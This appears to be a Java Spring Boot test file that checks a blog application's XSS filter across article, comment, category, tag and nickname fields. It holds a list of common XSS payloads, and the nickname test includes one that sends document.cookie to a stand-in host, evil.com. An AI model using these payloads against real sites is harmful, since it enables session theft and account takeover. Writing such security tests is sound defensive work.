package com.blog.security;

import com.blog.dto.LoginDTO;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
import static org.junit.jupiter.api.Assertions.*;

/**
 * XSS过滤器测试
 * 验证XSS攻击防护是否有效
 */
@SpringBootTest
@AutoConfigureMockMvc
class XssFilterTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    private String userToken;

    @BeforeEach
    void setUp() throws Exception {
        // 登录获取Token
        LoginDTO loginDTO = new LoginDTO();
        loginDTO.setUsername("user");
        loginDTO.setPassword("user123");

        MvcResult result = mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(loginDTO)))
                .andExpect(status().isOk())
                .andReturn();

        String response = result.getResponse().getContentAsString();
        userToken = objectMapper.readTree(response)
                .get("data").get("token").asText();
    }

    @Test
    void testXssInArticleTitle() throws Exception {
        // 尝试在文章标题中注入XSS脚本
        String maliciousTitle = "<script>alert('XSS')</script>";
        String articleJson = String.format(
            "{\"title\":\"%s\",\"content\":\"正常内容\",\"categoryId\":1,\"status\":1,\"tagIds\":[1]}",
            maliciousTitle
        );

        MvcResult result = mockMvc.perform(post("/api/articles")
                .header("Authorization", "Bearer " + userToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(articleJson))
                .andExpect(status().isOk())
                .andReturn();

        String response = result.getResponse().getContentAsString();
        Long articleId = objectMapper.readTree(response).get("data").asLong();

        // 验证XSS脚本被转义
        MvcResult getResult = mockMvc.perform(get("/api/articles/" + articleId))
                .andExpect(status().isOk())
                .andReturn();

        String articleResponse = getResult.getResponse().getContentAsString();
        String title = objectMapper.readTree(articleResponse)
                .get("data").get("title").asText();

        // 验证脚本标签被转义
        assertFalse(title.contains("<script>"), "XSS脚本未被过滤");
        assertTrue(title.contains("&lt;script&gt;") || title.contains("alert"), 
                "XSS脚本应该被转义");
    }

    @Test
    void testXssInArticleContent() throws Exception {
        // 尝试在文章内容中注入XSS
        String maliciousContent = "<img src=x onerror='alert(1)'>";
        String articleJson = String.format(
            "{\"title\":\"测试文章\",\"content\":\"%s\",\"categoryId\":1,\"status\":1,\"tagIds\":[1]}",
            maliciousContent.replace("'", "\\'")
        );

        mockMvc.perform(post("/api/articles")
                .header("Authorization", "Bearer " + userToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(articleJson))
                .andExpect(status().isOk());
    }

    @Test
    void testXssInComment() throws Exception {
        // 先创建文章
        String articleJson = "{\"title\":\"测试\",\"content\":\"内容\",\"categoryId\":1,\"status\":1,\"tagIds\":[1]}";
        MvcResult articleResult = mockMvc.perform(post("/api/articles")
                .header("Authorization", "Bearer " + userToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(articleJson))
                .andExpect(status().isOk())
                .andReturn();

        Long articleId = objectMapper.readTree(articleResult.getResponse().getContentAsString())
                .get("data").asLong();

        // 尝试在评论中注入XSS
        String maliciousComment = "<script>document.cookie</script>";
        String commentJson = String.format(
            "{\"articleId\":%d,\"content\":\"%s\"}",
            articleId, maliciousComment
        );

        mockMvc.perform(post("/api/comments")
                .header("Authorization", "Bearer " + userToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(commentJson))
                .andExpect(status().isOk());

        // 验证评论被转义
        MvcResult commentResult = mockMvc.perform(get("/api/comments?articleId=" + articleId))
                .andExpect(status().isOk())
                .andReturn();

        String commentResponse = commentResult.getResponse().getContentAsString();
        assertFalse(commentResponse.contains("<script>"), "评论中的XSS脚本未被过滤");
    }

    @Test
    void testXssInCategoryName() throws Exception {
        // 获取管理员Token
        LoginDTO adminLogin = new LoginDTO();
        adminLogin.setUsername("admin");
        adminLogin.setPassword("admin123");

        MvcResult adminResult = mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(adminLogin)))
                .andExpect(status().isOk())
                .andReturn();

        String adminToken = objectMapper.readTree(adminResult.getResponse().getContentAsString())
                .get("data").get("token").asText();

        // 尝试在分类名中注入XSS
        String maliciousName = "<svg onload=alert(1)>";
        String categoryJson = String.format(
            "{\"name\":\"%s\",\"description\":\"测试\"}",
            maliciousName
        );

        mockMvc.perform(post("/api/categories")
                .header("Authorization", "Bearer " + adminToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(categoryJson))
                .andExpect(status().isOk());
    }

    @Test
    void testXssInTagName() throws Exception {
        // 尝试在标签名中注入XSS
        String maliciousTag = "<iframe src='javascript:alert(1)'>";
        String tagJson = String.format("{\"name\":\"%s\"}", maliciousTag);

        mockMvc.perform(post("/api/tags")
                .header("Authorization", "Bearer " + userToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(tagJson))
                .andExpect(status().isOk());
    }

    @Test
    void testXssInUserUpdate() throws Exception {
        // 尝试在用户昵称中注入XSS
        String maliciousNickname = "<script>fetch('http://evil.com?cookie='+document.cookie)</script>";
        String updateJson = String.format(
            "{\"nickname\":\"%s\",\"email\":\"test@test.com\"}",
            maliciousNickname
        );

        mockMvc.perform(put("/api/users/2")
                .header("Authorization", "Bearer " + userToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(updateJson))
                .andExpect(status().isOk());
    }

    @Test
    void testMultipleXssVectors() throws Exception {
        // 测试多种XSS攻击向量
        String[] xssVectors = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<div style='background:url(javascript:alert(1))'>",
            "javascript:alert(1)",
            "<a href='javascript:alert(1)'>click</a>"
        };

        for (String xssVector : xssVectors) {
            String articleJson = String.format(
                "{\"title\":\"%s\",\"content\":\"测试\",\"categoryId\":1,\"status\":1,\"tagIds\":[1]}",
                xssVector.replace("\"", "\\\"").replace("'", "\\'")
            );

            // 所有XSS向量都应该被成功处理（不抛出异常）
            mockMvc.perform(post("/api/articles")
                    .header("Authorization", "Bearer " + userToken)
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(articleJson))
                    .andExpect(status().isOk());
        }
    }
}
